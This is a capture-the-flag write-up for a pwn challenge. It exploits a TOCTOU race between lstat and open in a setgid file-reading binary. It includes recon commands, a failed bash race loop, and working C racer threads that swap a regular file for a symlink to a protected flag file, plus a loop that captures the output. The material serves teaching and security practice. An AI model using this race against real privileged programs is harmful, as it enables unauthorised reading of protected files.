# The Asymptote

**Category:** Pwn | **Difficulty:** Medium (150 pts) | **Flag:** `IIITL{4cc355_ch3ck_p4553d_bu7_f1l3_5w4pp3d_110411185393}`

## TL;DR

A setgid binary reads `welcome.txt` but checks for symlinks first: classic TOCTOU setup. We win the race between the security check (`lstat`) and the file open (`open`) by hammering a swap between a real file and a symlink using C threads, forcing the binary to read `flag.txt` under its elevated group privileges.

## What We're Given

A TCP service at `nc 34.131.216.230 1338` that drops us into an interactive shell session as the `ctf` user. Inside that session lives a `challenge` binary, a `welcome.txt`, and an inaccessible `flag.txt`.

The challenge description is beautifully on-theme:

> "A mathematical proof guarantees that an object can never truly reach its destination, as it must always traverse half the remaining distance. Our file reader operates on similar absolute logic. It is demonstrably secure."

That's Zeno's paradox: the asymptote metaphor. The binary can never *quite* reach the flag. Or so it claims. The flag itself even spells it out after the fact: `4cc355_ch3ck_p4553d_bu7_f1l3_5w4pp3d`: "access check passed but file swapped." The challenge author really committed to the bit.

## Initial Recon

The first thing we do when we land in the shell is poke at the binary:

```
ctf@589951e5aa17:~/sessions/player_Qbia6C$ ./challenge flag.txt
Welcome, 8r@v3_H@ck3r.

If you're reading this, you've already done more work than most people.

ctf@589951e5aa17:~/sessions/player_Qbia6C$ ./challenge /etc/passwd
Welcome, 8r@v3_H@ck3r.

If you're reading this, you've already done more work than most people.
```

Okay. The binary completely ignores `argv[1]`. Whatever path you give it, it reads `welcome.txt` from the current directory. That's hardcoded.

Next obvious move: symlink `welcome.txt` to `flag.txt`:

```bash
rm -f welcome.txt && ln -s flag.txt welcome.txt && ./challenge
# → "Security Alert: You don't have permission to read welcome.txt"
```

The binary detects symlinks. It's doing some kind of check before opening the file. And importantly: the binary is setgid `flag_group`, meaning it runs with elevated group privileges. If we could get it to open `flag.txt` under those privileges, we'd have our flag. The binary can read `flag.txt`; we can't.

A FIFO (named pipe) was interesting too:

```bash
mkfifo welcome.txt
echo "test_content" > welcome.txt &
./challenge
# → prints "test_content"
```

A FIFO bypasses the symlink check! The binary doesn't detect it as a symlink because it isn't one. This confirmed the check is specifically `lstat()` looking for `S_ISLNK`: it doesn't validate that the file is actually a regular file in any deeper sense. But this doesn't help us directly, since we still can't read `flag.txt` ourselves to pipe it anywhere.

## The Vulnerability / Trick

This is a classic **TOCTOU race condition**: short for Time-Of-Check Time-Of-Use. The idea is simple: a program checks whether something is safe, and then uses it. If you can change that "something" in the tiny gap between the check and the use, you can fool the program into doing something it thought it had verified was safe.

Here's what the binary does internally:

1. `lstat("welcome.txt")`: checks the file's metadata. Sees it's a regular file. Good, passes the security check.
2. *(tiny gap in time)*
3. `open("welcome.txt")`: opens the file for reading. This call **follows symlinks**.

If we can swap `welcome.txt` from a real file to a symlink pointing at `flag.txt` in that tiny gap between step 1 and step 3, the binary's lstat sees a regular file, the check passes, but then open follows our symlink and reads `flag.txt`: which the binary has the group permissions to read.

The binary can't detect the swap because from its perspective, it already checked. The check passed. It trusts that. This is exactly why TOCTOU is insidious: the check and the use are never atomic. There's always a window, however small.

The flag itself tells the story: **access check passed, but file swapped**.

## Building the Exploit

The race window is tiny: maybe a few microseconds between `lstat` and `open`. Shell scripts are way too slow for this. We tried a bash race loop first:

```bash
# race.sh: this failed miserably
while true; do
  ln -sf real.txt welcome.txt
  ln -sf flag.txt welcome.txt
done
```

Running this in the background while hammering `./challenge` 200 times gave us... nothing. Just `test` over and over. The shell loop is too slow. Each `ln -sf` involves a fork/exec cycle, which is orders of magnitude too sluggish.

We need C. Specifically, we need C threads spinning in a tight loop doing raw syscalls: no forking, no overhead, just a CPU core hammering `unlink/open/unlink/symlink` as fast as the OS will let it.

Here's the core of `solve.c`:

```c
void *racer(void *arg) {
    while (running) {
        unlink("welcome.txt");
        // Place a real file: passes the lstat check
        int fd = open("welcome.txt", O_CREAT|O_WRONLY|O_TRUNC, 0644);
        if (fd >= 0) {
            write(fd, "real\n", 5);
            close(fd);
        }
        // NOW swap to a symlink: if binary is between lstat and open, it reads flag.txt
        unlink("welcome.txt");
        symlink("flag.txt", "welcome.txt");
    }
    return NULL;
}
```

Three of these threads run simultaneously. The sequence matters:

- `unlink` + `open(...O_CREAT...)` creates a fresh regular file. This state passes the `lstat` check.
- `unlink` + `symlink` swaps it to a symlink pointing at `flag.txt`. This state is what we want the `open()` call to see.

We cycle between these two states as fast as possible, hoping the challenge binary's execution lands in that sweet spot.

The main loop then runs the challenge binary over and over and grabs any output containing `IIITL`:

```c
for (int i = 0; i < 100000 && !found; i++) {
    FILE *fp = popen("./challenge 2>&1", "r");
    if (!fp) continue;
    while (fgets(buf, sizeof(buf), fp)) {
        if (strstr(buf, "IIITL")) {
            printf("FLAG FOUND: %s\n", buf);
            found = 1;
        }
    }
    pclose(fp);
}
```

We compile it directly on the target (gcc is available):

```bash
gcc -O2 -pthread -o solve solve.c
./solve
```

## Running It

The race resolves within a few seconds. The threads are cycling so fast that statistically, the binary's execution has to land in the window eventually. When it does:

```
FLAG FOUND: IIITL{4cc355_ch3ck_p4553d_bu7_f1l3_5w4pp3d_110411185393}
```

Done. The binary's setgid group privilege reads `flag.txt` for us, because at the moment `open("welcome.txt")` executed, `welcome.txt` was our symlink.

## Key Takeaways

**The TOCTOU pattern is everywhere.** Any time a program does "check, then use" on a filesystem path: especially with elevated privileges: it's potentially vulnerable. The classic real-world example is the `/tmp` race that used to plague setuid utilities for decades. If you ever see code that does `access()` or `stat()` followed by `open()`, your TOCTOU radar should ping.

**Shell is too slow for tight races.** Each shell command involves a fork+exec. For races measured in microseconds, you need compiled code. When a bash or Perl race fails, escalate to C immediately.

**Three threads beat one.** More threads = more CPU time spent in the racer = smaller window needed. With three threads each doing `unlink/creat/unlink/symlink` continuously, the cycle time drops dramatically.

**The FIFO trick was a useful probe.** It didn't give us the flag, but it confirmed the security check was `lstat`-based and not something deeper. When the FIFO bypassed the check, we knew for certain the vulnerability was in the check/use gap, not in the binary's logic elsewhere. Dead ends teach you the shape of the problem.

**Read the flavor text.** "Our file reader operates on similar absolute logic. It is demonstrably secure." That "absolute logic" is doing the check-then-use sequence without any atomic guarantee. The description is basically telling you that the security is logically sound but temporally broken. Zeno's paradox in software form: the check can never quite catch up to the use.

For deeper reading on TOCTOU and filesystem races, check out [OWASP's coverage](https://owasp.org/www-community/vulnerabilities/Time_of_check_time_of_use) or the classic Viega & McGraw chapter on race conditions in *Building Secure Software*.
